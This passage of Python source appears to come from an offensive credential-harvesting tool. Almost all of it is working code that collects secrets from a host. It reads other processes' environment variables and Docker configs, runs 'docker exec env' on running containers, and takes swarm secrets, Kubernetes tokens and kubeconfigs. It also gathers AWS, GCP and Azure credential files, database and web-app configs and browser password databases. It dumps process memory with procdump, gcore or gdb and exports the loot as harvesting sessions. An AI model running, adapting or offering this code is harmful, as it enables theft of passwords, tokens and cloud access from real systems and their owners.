                if any(keyword in key.lower() for keyword in ['password', 'secret', 'key', 'token']):
                    env_creds.append({
                        'variable': key,
                        'value': value,
                        'source': 'current_environment'
                    })

            # Check /proc/*/environ for other processes
            try:
                for proc_dir in os.listdir('/proc'):
                    if proc_dir.isdigit():
                        environ_file = f'/proc/{proc_dir}/environ'

                        if os.path.exists(environ_file):
                            try:
                                with open(environ_file, 'rb') as f:
                                    environ_data = f.read().decode('utf-8', errors='ignore')

                                    for env_var in environ_data.split('\x00'):
                                        if '=' in env_var:
                                            key, value = env_var.split('=', 1)

                                            if any(keyword in key.lower() for keyword in ['password', 'secret', 'key', 'token']):
                                                env_creds.append({
                                                    'variable': key,
                                                    'value': value,
                                                    'source': f'process_{proc_dir}'
                                                })

                            except Exception:
                                continue

            except Exception:
                pass

            if env_creds:
                credentials['environment_variables'] = env_creds

        except Exception as e:
            self.logger.debug(f"Environment variable extraction failed: {e}")

        return credentials

    # Additional Linux technique stubs

    def _linux_docker_credentials(self) -> Dict[str, Any]:
        """Extract Docker credentials from configuration and runtime data."""
        credentials = {'docker_credentials': []}

        try:
            # Docker configuration paths
            docker_config_paths = [
                '~/.docker/config.json',
                '/root/.docker/config.json',
                '/var/lib/docker/config.json',
                '~/.dockercfg',
                '/etc/docker/daemon.json'
            ]

            for config_path in docker_config_paths:
                expanded_path = os.path.expanduser(config_path)
                if os.path.exists(expanded_path):
                    try:
                        with open(expanded_path, 'r') as f:
                            docker_config = json.load(f)

                        # Extract registry authentication
                        auths = docker_config.get('auths', {})
                        for registry, auth_data in auths.items():
                            auth_entry = {
                                'registry': registry,
                                'auth_data': auth_data,
                                'source': expanded_path
                            }

                            # Decode basic auth if present
                            if 'auth' in auth_data:
                                try:
                                    import base64
                                    decoded_auth = base64.b64decode(auth_data['auth']).decode('utf-8')
                                    if ':' in decoded_auth:
                                        username, password = decoded_auth.split(':', 1)
                                        auth_entry['username'] = username
                                        auth_entry['password'] = password
                                except Exception:
                                    pass

                            credentials['docker_credentials'].append(auth_entry)

                        # Extract credential helpers
                        cred_helpers = docker_config.get('credHelpers', {})
                        if cred_helpers:
                            credentials['docker_credentials'].append({
                                'type': 'credential_helpers',
                                'helpers': cred_helpers,
                                'source': expanded_path
                            })

                    except Exception as e:
                        self.logger.debug(f"Error reading Docker config {expanded_path}: {e}")

            # Docker environment variables from running containers
            try:
                import subprocess

                # Get running containers
                result = subprocess.run(['docker', 'ps', '--format', '{{.ID}}'],
                                      capture_output=True, text=True, timeout=10)

                if result.returncode == 0:
                    container_ids = result.stdout.strip().split('\n')
                    for container_id in container_ids:
                        if container_id:
                            try:
                                # Get environment variables
                                env_result = subprocess.run(['docker', 'exec', container_id, 'env'],
                                                          capture_output=True, text=True, timeout=5)

                                if env_result.returncode == 0:
                                    env_vars = []
                                    for line in env_result.stdout.split('\n'):
                                        if any(keyword in line.upper() for keyword in
                                              ['PASSWORD', 'SECRET', 'TOKEN', 'KEY', 'API']):
                                            env_vars.append(line.strip())

                                    if env_vars:
                                        credentials['docker_credentials'].append({
                                            'type': 'container_environment',
                                            'container_id': container_id,
                                            'environment_vars': env_vars,
                                            'source': 'docker_exec'
                                        })

                            except subprocess.TimeoutExpired:
                                continue
                            except Exception as e:
                                self.logger.debug(f"Error extracting container env {container_id}: {e}")

            except FileNotFoundError:
                # Docker not installed or not in PATH
                pass
            except Exception as e:
                self.logger.debug(f"Error accessing Docker containers: {e}")

            # Docker secrets (if accessible)
            docker_secrets_path = '/var/lib/docker/swarm/secrets'
            if os.path.exists(docker_secrets_path):
                try:
                    for secret_file in os.listdir(docker_secrets_path):
                        secret_path = os.path.join(docker_secrets_path, secret_file)
                        if os.path.isfile(secret_path):
                            try:
                                with open(secret_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    secret_content = f.read()

                                credentials['docker_credentials'].append({
                                    'type': 'docker_secret',
                                    'secret_name': secret_file,
                                    'content': secret_content[:1000],  # Limit content size
                                    'source': secret_path
                                })
                            except Exception as e:
                                self.logger.debug(f"Error reading Docker secret {secret_path}: {e}")

                except PermissionError:
                    pass
                except Exception as e:
                    self.logger.debug(f"Error accessing Docker secrets: {e}")

        except Exception as e:
            self.logger.error(f"Error extracting Docker credentials: {e}")

        return credentials

    def _linux_kubernetes_tokens(self) -> Dict[str, Any]:
        """Extract Kubernetes tokens and service account credentials."""
        credentials = {'kubernetes_credentials': []}

        try:
            # Kubernetes service account token paths
            k8s_token_paths = [
                '/var/run/secrets/kubernetes.io/serviceaccount/token',
                '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                '/var/run/secrets/kubernetes.io/serviceaccount/namespace'
            ]

            service_account_data = {}
            for token_path in k8s_token_paths:
                if os.path.exists(token_path):
                    try:
                        with open(token_path, 'r') as f:
                            content = f.read().strip()

                        file_type = os.path.basename(token_path)
                        service_account_data[file_type] = content

                    except Exception as e:
                        self.logger.debug(f"Error reading K8s token {token_path}: {e}")

            if service_account_data:
                credentials['kubernetes_credentials'].append({
                    'type': 'service_account',
                    'data': service_account_data,
                    'source': 'mounted_secrets'
                })

            # Kubernetes config files
            k8s_config_paths = [
                '~/.kube/config',
                '/root/.kube/config',
                '/etc/kubernetes/admin.conf',
                '/etc/kubernetes/kubelet.conf',
                '/etc/kubernetes/controller-manager.conf',
                '/etc/kubernetes/scheduler.conf'
            ]

            for config_path in k8s_config_paths:
                expanded_path = os.path.expanduser(config_path)
                if os.path.exists(expanded_path):
                    try:
                        with open(expanded_path, 'r') as f:
                            content = f.read()

                        # Parse YAML config
                        try:
                            import yaml
                            k8s_config = yaml.safe_load(content)

                            # Extract cluster information
                            clusters = k8s_config.get('clusters', [])
                            users = k8s_config.get('users', [])
                            contexts = k8s_config.get('contexts', [])

                            for user in users:
                                user_data = user.get('user', {})
                                if user_data:
                                    credentials['kubernetes_credentials'].append({
                                        'type': 'kubeconfig_user',
                                        'name': user.get('name'),
                                        'user_data': user_data,
                                        'source': expanded_path
                                    })

                            for cluster in clusters:
                                cluster_data = cluster.get('cluster', {})
                                if cluster_data:
                                    credentials['kubernetes_credentials'].append({
                                        'type': 'kubeconfig_cluster',
                                        'name': cluster.get('name'),
                                        'cluster_data': cluster_data,
                                        'source': expanded_path
                                    })

                        except ImportError:
                            # YAML parser not available, try basic text parsing
                            lines = content.split('\n')
                            for line in lines:
                                if any(keyword in line for keyword in ['token:', 'password:', 'key:', 'cert:']):
                                    credentials['kubernetes_credentials'].append({
                                        'type': 'kubeconfig_text',
                                        'line': line.strip(),
                                        'source': expanded_path
                                    })

                    except Exception as e:
                        self.logger.debug(f"Error reading K8s config {expanded_path}: {e}")

            # Kubernetes environment variables
            k8s_env_vars = []
            for key, value in os.environ.items():
                if any(keyword in key.upper() for keyword in ['KUBE', 'K8S', 'KUBERNETES']):
                    k8s_env_vars.append({'key': key, 'value': value})

            if k8s_env_vars:
                credentials['kubernetes_credentials'].append({
                    'type': 'environment_variables',
                    'variables': k8s_env_vars,
                    'source': 'environment'
                })

            # Check for kubectl binary and try to extract current context
            try:
                import subprocess

                # Get current context
                result = subprocess.run(['kubectl', 'config', 'current-context'],
                                      capture_output=True, text=True, timeout=5)

                if result.returncode == 0:
                    current_context = result.stdout.strip()
                    credentials['kubernetes_credentials'].append({
                        'type': 'current_context',
                        'context': current_context,
                        'source': 'kubectl'
                    })

                # Try to get cluster info
                cluster_result = subprocess.run(['kubectl', 'cluster-info'],
                                              capture_output=True, text=True, timeout=5)

                if cluster_result.returncode == 0:
                    credentials['kubernetes_credentials'].append({
                        'type': 'cluster_info',
                        'info': cluster_result.stdout,
                        'source': 'kubectl'
                    })

            except FileNotFoundError:
                # kubectl not installed
                pass
            except Exception as e:
                self.logger.debug(f"Error running kubectl: {e}")

        except Exception as e:
            self.logger.error(f"Error extracting Kubernetes credentials: {e}")

        return credentials

    def _linux_database_configs(self) -> Dict[str, Any]:
        """Extract database configuration credentials from config files."""
        credentials = {'database_configs': []}

        try:
            # Common database configuration file locations
            db_config_paths = [
                '/etc/mysql/my.cnf',
                '/etc/postgresql/*/main/postgresql.conf',
                '/etc/mongodb.conf',
                '/etc/redis.conf',
                '~/.my.cnf',
                '/usr/local/etc/mysql/my.cnf',
                '/opt/lampp/etc/my.cnf'
            ]

            for config_path in db_config_paths:
                expanded_path = os.path.expanduser(config_path)

                if '*' in expanded_path:
                    import glob
                    matching_files = glob.glob(expanded_path)
                    files_to_check = matching_files
                else:
                    files_to_check = [expanded_path] if os.path.exists(expanded_path) else []

                for file_path in files_to_check:
                    try:
                        with open(file_path, 'r') as f:
                            content = f.read()

                        # Extract database credentials
                        creds = self._extract_credentials_from_text(content)
                        if creds:
                            credentials['database_configs'].append({
                                'config_file': file_path,
                                'credentials': creds,
                                'type': 'database_config'
                            })

                    except (PermissionError, FileNotFoundError):
                        continue
                    except Exception as e:
                        self.logger.debug(f"Error reading database config {file_path}: {e}")

        except Exception as e:
            self.logger.error(f"Error extracting database configs: {e}")

        return credentials

    def _linux_application_configs(self) -> Dict[str, Any]:
        """Extract application configuration credentials from various app configs."""
        credentials = {'application_configs': []}

        try:
            # Common application configuration locations
            app_config_paths = [
                '/etc/apache2/.htpasswd',
                '/etc/nginx/.htpasswd',
                '/etc/vsftpd.conf',
                '/etc/proftpd/proftpd.conf',
                '/etc/samba/smb.conf',
                '/opt/*/conf/*.conf',
                '~/.config/*/config',
                '/var/www/html/wp-config.php',
                '/var/www/html/config.php'
            ]

            for config_path in app_config_paths:
                expanded_path = os.path.expanduser(config_path)

                if '*' in expanded_path:
                    import glob
                    matching_files = glob.glob(expanded_path, recursive=True)
                    files_to_check = matching_files
                else:
                    files_to_check = [expanded_path] if os.path.exists(expanded_path) else []

                for file_path in files_to_check:
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()

                        # Extract credentials from app configs
                        creds = self._extract_credentials_from_text(content)
                        if creds:
                            credentials['application_configs'].append({
                                'config_file': file_path,
                                'credentials': creds,
                                'type': 'application_config'
                            })

                    except (PermissionError, FileNotFoundError):
                        continue
                    except Exception as e:
                        self.logger.debug(f"Error reading app config {file_path}: {e}")

        except Exception as e:
            self.logger.error(f"Error extracting application configs: {e}")

        return credentials

    def _linux_cloud_credentials(self) -> Dict[str, Any]:
        """Extract cloud provider credentials from configuration files."""
        credentials = {'cloud_credentials': []}

        try:
            # AWS credentials
            aws_paths = [
                '~/.aws/credentials',
                '~/.aws/config',
                '/root/.aws/credentials'
            ]

            for aws_path in aws_paths:
                expanded_path = os.path.expanduser(aws_path)
                if os.path.exists(expanded_path):
                    try:
                        with open(expanded_path, 'r') as f:
                            content = f.read()

                        import configparser
                        config = configparser.ConfigParser()
                        config.read_string(content)

                        for section in config.sections():
                            section_data = dict(config[section])
                            if section_data:
                                credentials['cloud_credentials'].append({
                                    'provider': 'aws',
                                    'profile': section,
                                    'credentials': section_data,
                                    'source': expanded_path
                                })

                    except Exception as e:
                        self.logger.debug(f"Error reading AWS config {expanded_path}: {e}")

            # Google Cloud credentials
            gcp_paths = [
                '~/.config/gcloud/credentials.db',
                '~/.config/gcloud/application_default_credentials.json',
                '/root/.config/gcloud/application_default_credentials.json'
            ]

            for gcp_path in gcp_paths:
                expanded_path = os.path.expanduser(gcp_path)
                if os.path.exists(expanded_path):
                    try:
                        if expanded_path.endswith('.json'):
                            with open(expanded_path, 'r') as f:
                                gcp_creds = json.load(f)
                            credentials['cloud_credentials'].append({
                                'provider': 'gcp',
                                'credentials': gcp_creds,
                                'source': expanded_path
                            })
                    except Exception as e:
                        self.logger.debug(f"Error reading GCP config {expanded_path}: {e}")

            # Azure credentials
            azure_paths = [
                '~/.azure/accessTokens.json',
                '~/.azure/azureProfile.json'
            ]

            for azure_path in azure_paths:
                expanded_path = os.path.expanduser(azure_path)
                if os.path.exists(expanded_path):
                    try:
                        with open(expanded_path, 'r') as f:
                            azure_creds = json.load(f)
                        credentials['cloud_credentials'].append({
                            'provider': 'azure',
                            'credentials': azure_creds,
                            'source': expanded_path
                        })
                    except Exception as e:
                        self.logger.debug(f"Error reading Azure config {expanded_path}: {e}")

        except Exception as e:
            self.logger.error(f"Error extracting cloud credentials: {e}")

        return credentials

    def _linux_memory_dump(self) -> Dict[str, Any]:
        """Extract credentials from memory dump analysis."""
        credentials = {'memory_dump': []}

        try:
            # This is a simplified memory dump analysis
            # In practice, this would use tools like volatility or gdb

            # Check if we have access to /proc/*/maps for process memory analysis
            proc_dirs = []
            try:
                proc_dirs = [d for d in os.listdir('/proc') if d.isdigit()]
            except PermissionError:
                pass

            for pid in proc_dirs[:10]:  # Limit to first 10 processes
                try:
                    maps_file = f'/proc/{pid}/maps'
                    environ_file = f'/proc/{pid}/environ'

                    # Check environment variables for credentials
                    if os.path.exists(environ_file):
                        try:
                            with open(environ_file, 'rb') as f:
                                environ_data = f.read().decode('utf-8', errors='ignore')

                            # Split by null bytes and look for credential patterns
                            env_vars = environ_data.split('\x00')
                            for env_var in env_vars:
                                if any(keyword in env_var.upper() for keyword in ['PASSWORD', 'SECRET', 'TOKEN', 'KEY']):
                                    if '=' in env_var:
                                        key, value = env_var.split('=', 1)
                                        credentials['memory_dump'].append({
                                            'pid': pid,
                                            'type': 'environment_variable',
                                            'key': key,
                                            'value': value,
                                            'source': 'proc_environ'
                                        })

                        except PermissionError:
                            continue

                except Exception as e:
                    self.logger.debug(f"Error analyzing process {pid}: {e}")
                    continue

        except Exception as e:
            self.logger.error(f"Error extracting memory dump credentials: {e}")

        return credentials

    # Helper methods


    def _extract_credentials_from_file(self, file_path: str) -> List[Dict[str, Any]]:
        """Extract credentials from a single file."""
        credentials = []

        try:
            # Skip binary files
            if not self._is_text_file(file_path):
                return credentials

            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

                # Extract using credential patterns
                creds = self._extract_credentials_from_text(content)
                credentials.extend(creds)

        except Exception as e:
            self.logger.debug(f"Error extracting from {file_path}: {e}")

        return credentials

    def _extract_credentials_from_text(self, text: str) -> List[Dict[str, Any]]:
        """Extract credentials from text using regex patterns."""
        credentials = []

        try:
            # Check each pattern category
            for category, patterns in self.credential_patterns.items():
                for pattern in patterns:
                    matches = re.finditer(pattern, text, re.IGNORECASE)

                    for match in matches:
                        if category == 'database':
                            # Database URL pattern has multiple groups
                            if len(match.groups()) >= 4:
                                credentials.append({
                                    'type': 'database_url',
                                    'username': match.group(1),
                                    'password': match.group(2),
                                    'host': match.group(3),
                                    'database': match.group(4),
                                    'category': category
                                })
                        else:
                            # Simple key-value pattern
                            credentials.append({
                                'type': category,
                                'value': match.group(1) if match.groups() else match.group(0),
                                'category': category,
                                'context': text[max(0, match.start()-50):match.end()+50]
                            })

        except Exception as e:
            self.logger.debug(f"Error extracting credentials from text: {e}")

        return credentials

    def _extract_browser_credentials(self, db_path: str, browser: str) -> List[Dict[str, Any]]:
        """Extract credentials from browser database."""
        credentials = []

        try:
            if not os.path.exists(db_path):
                return credentials

            # Copy database to avoid locks
            import shutil
            import tempfile

            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                shutil.copy2(db_path, temp_file.name)
                temp_db_path = temp_file.name

            # Extract from SQLite database
            try:
                conn = sqlite3.connect(temp_db_path)
                cursor = conn.cursor()

                # Try different table structures
                tables = ['logins', 'login_data', 'passwords']

                for table in tables:
                    try:
                        cursor.execute(f"SELECT * FROM {table}")
                        columns = [desc[0] for desc in cursor.description]

                        for row in cursor.fetchall():
                            row_dict = dict(zip(columns, row))

                            # Extract relevant fields
                            cred = {
                                'browser': browser,
                                'type': 'browser_password'
                            }

                            # Map common column names
                            field_mapping = {
                                'origin_url': ['origin_url', 'url', 'hostname'],
                                'username': ['username_value', 'username', 'user'],
                                'password': ['password_value', 'password', 'passwd']
                            }

                            for field, possible_columns in field_mapping.items():
                                for col in possible_columns:
                                    if col in row_dict:
                                        cred[field] = row_dict[col]
                                        break

                            if 'username' in cred and 'password' in cred:
                                credentials.append(cred)

                        break  # Found valid table

                    except sqlite3.OperationalError:
                        continue  # Try next table

                conn.close()

            finally:
                # Cleanup temp file
                try:
                    os.unlink(temp_db_path)
                except Exception:
                    pass

        except Exception as e:
            self.logger.debug(f"Browser credential extraction failed for {browser}: {e}")

        return credentials

    def _is_text_file(self, file_path: str) -> bool:
        """Check if file is likely a text file."""
        try:
            with open(file_path, 'rb') as f:
                chunk = f.read(1024)

            # Check for null bytes (indication of binary file)
            if b'\x00' in chunk:
                return False

            # Try to decode as UTF-8
            chunk.decode('utf-8')
            return True

        except Exception:
            return False

    def _create_windows_memory_dump(self, process_name: str) -> Optional[str]:
        """Create Windows memory dump."""
        try:
            dump_path = f"C:\\Temp\\{process_name}_{int(time.time())}.dmp"

            # Try different dump methods
            dump_commands = [
                f'procdump -ma {process_name} {dump_path}',
                f'tasklist /fi "imagename eq {process_name}"'
            ]

            for cmd in dump_commands:
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if result.returncode == 0:
                        return dump_path
                except Exception:
                    continue

        except Exception as e:
            self.logger.debug(f"Windows memory dump creation failed: {e}")

        return None

    def _create_linux_memory_dump(self, process_name: Optional[str]) -> Optional[str]:
        """Create Linux memory dump."""
        try:
            if not process_name:
                # Default to dumping current process memory
                process_name = str(os.getpid())

            dump_path = f"/tmp/{process_name}_{int(time.time())}.dump"

            # Try gcore or gdb
            dump_commands = [
                f'gcore -o {dump_path} {process_name}',
                f'gdb --batch --quiet -ex "generate-core-file {dump_path}" --pid {process_name}'
            ]

            for cmd in dump_commands:
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if result.returncode == 0:
                        return dump_path
                except Exception:
                    continue

        except Exception as e:
            self.logger.debug(f"Linux memory dump creation failed: {e}")

        return None

    def _parse_memory_dump(self, dump_path: str) -> Dict[str, Any]:
        """Parse memory dump for credentials."""
        credentials = {}

        try:
            # This would use tools like pypykatz, volatility, etc.
            # For now, just search for credential patterns in dump
            with open(dump_path, 'rb') as f:
                # Read in chunks to avoid memory issues
                chunk_size = 1024 * 1024  # 1MB chunks
                chunk_num = 0

                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break

                    # Try to decode and search for patterns
                    try:
                        text = chunk.decode('utf-8', errors='ignore')
                        chunk_creds = self._extract_credentials_from_text(text)

                        if chunk_creds:
                            credentials[f'chunk_{chunk_num}'] = chunk_creds

                    except Exception:
                        pass

                    chunk_num += 1

        except Exception as e:
            self.logger.debug(f"Memory dump parsing failed: {e}")

        return credentials

    def _process_credentials(self, credentials: Dict[str, Any], output_format: str) -> Any:
        """Process and format harvested credentials."""
        if output_format == 'json':
            return json.dumps(credentials, indent=2)
        elif output_format == 'csv':
            # Convert to CSV format
            csv_data = []
            for technique, creds in credentials.items():
                if isinstance(creds, list):
                    for cred in creds:
                        row = {'technique': technique}
                        if isinstance(cred, dict):
                            row.update(cred)
                        csv_data.append(row)
            return csv_data
        else:
            return credentials

    def _count_credentials(self, credentials: Dict[str, Any]) -> int:
        """Count total number of credentials found."""
        count = 0

        for technique, creds in credentials.items():
            if isinstance(creds, list):
                count += len(creds)
            elif isinstance(creds, dict):
                count += len(creds)

        return count

    def _generate_session_id(self) -> str:
        """Generate unique session identifier."""
        import hashlib
        import random

        data = f"{time.time()}-{random.randint(1000, 9999)}"
        return hashlib.sha256(data.encode()).hexdigest()[:16]

    # Public interface methods

    def get_harvested_sessions(self) -> List[Dict[str, Any]]:
        """Get list of credential harvesting sessions."""
        sessions = []

        for session_id, session_info in self.harvested_credentials.items():
            sessions.append({
                'session_id': session_id,
                'timestamp': session_info['timestamp'],
                'target_os': session_info['target_os'],
                'techniques': session_info['techniques'],
                'credential_count': self._count_credentials(session_info['credentials'])
            })

        return sessions

    def get_session_credentials(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get credentials for a specific session."""
        return self.harvested_credentials.get(session_id)

    def export_credentials(self,
                          session_id: str,
                          output_file: str,
                          output_format: str = 'json') -> bool:
        """Export credentials to file."""
        try:
            if session_id not in self.harvested_credentials:
                return False

            credentials = self.harvested_credentials[session_id]['credentials']
            formatted_creds = self._process_credentials(credentials, output_format)

            if output_format == 'json':
                with open(output_file, 'w') as f:
                    f.write(formatted_creds)
            elif output_format == 'csv':
                import csv
                with open(output_file, 'w', newline='') as f:
                    if formatted_creds:
                        writer = csv.DictWriter(f, fieldnames=formatted_creds[0].keys())
                        writer.writeheader()
                        writer.writerows(formatted_creds)
            else:
                with open(output_file, 'w') as f:
                    f.write(str(formatted_creds))

            return True

        except Exception as e:
            self.logger.error(f"Credential export failed: {e}")
            return False

    def clear_session(self, session_id: str) -> bool:
        """Clear a specific harvesting session."""
        if session_id in self.harvested_credentials:
            del self.harvested_credentials[session_id]
            return True
        return False

    def clear_all_sessions(self):
        """Clear all harvesting sessions."""
        self.harvested_credentials.clear()

    def get_available_techniques(self, target_os: Optional[str] = None) -> Dict[str, List[str]]:
        """Get available harvesting techniques."""
        if target_os:
            return {target_os: list(self.harvesting_techniques.get(target_os, {}).keys())}
        else:
            return {
                os: list(techniques.keys())
                for os, techniques in self.harvesting_techniques.items()
            }

    def validate_credentials(self, credentials: Dict[str, Any]) -> Dict[str, Any]:
        """Validate harvested credentials against targets."""
        validation_results = {
            'validated': 0,
            'invalid': 0,
            'results': [],
            'validation_time': time.time()
        }

        if not credentials:
            validation_results['results'].append({
                'status': 'error',
                'message': 'No credentials provided for validation'
            })
            return validation_results

        self.logger.info(f"Validating {len(credentials)} credential sets")

        for technique, cred_data in credentials.items():
            technique_result = {
                'technique': technique,
                'valid_credentials': [],
                'invalid_credentials': [],
                'errors': []
            }

            try:
                if isinstance(cred_data, list):
                    for i, cred in enumerate(cred_data):
                        if self._validate_single_credential(cred):
                            technique_result['valid_credentials'].append(cred)
                            validation_results['validated'] += 1
                        else:
                            technique_result['invalid_credentials'].append(cred)
                            validation_results['invalid'] += 1

                elif isinstance(cred_data, dict):
                    if self._validate_single_credential(cred_data):
                        technique_result['valid_credentials'].append(cred_data)
                        validation_results['validated'] += 1
                    else:
                        technique_result['invalid_credentials'].append(cred_data)
                        validation_results['invalid'] += 1
                else:
                    technique_result['errors'].append(f"Invalid credential data type: {type(cred_data)}")
                    validation_results['invalid'] += 1

            except Exception as e:
                technique_result['errors'].append(str(e))
                self.logger.warning(f"Error validating credentials for {technique}: {e}")

            validation_results['results'].append(technique_result)

        self.logger.info(f"Validation complete: {validation_results['validated']} valid, {validation_results['invalid']} invalid")
        return validation_results

    def _validate_single_credential(self, credential: Any) -> bool:
        """Validate a single credential entry."""
        if not isinstance(credential, dict):
            return False

        # Check for common credential fields
        required_fields = {'username', 'password', 'domain', 'hash', 'key', 'token'}
        credential_fields = set(credential.keys())

        # Must have at least one authentication field
        if not credential_fields.intersection(required_fields):
            return False

        # Validate specific field formats
        if 'username' in credential:
            username = credential['username']
            if not username or not isinstance(username, str) or len(username.strip()) == 0:
                return False

        if 'password' in credential:
            password = credential['password']
            if not isinstance(password, str):
                return False

        if 'hash' in credential:
            hash_value = credential['hash']
            if not isinstance(hash_value, str) or len(hash_value) < 16:
                return False

        if 'domain' in credential:
            domain = credential['domain']
            if not isinstance(domain, str):
                return False

        return True
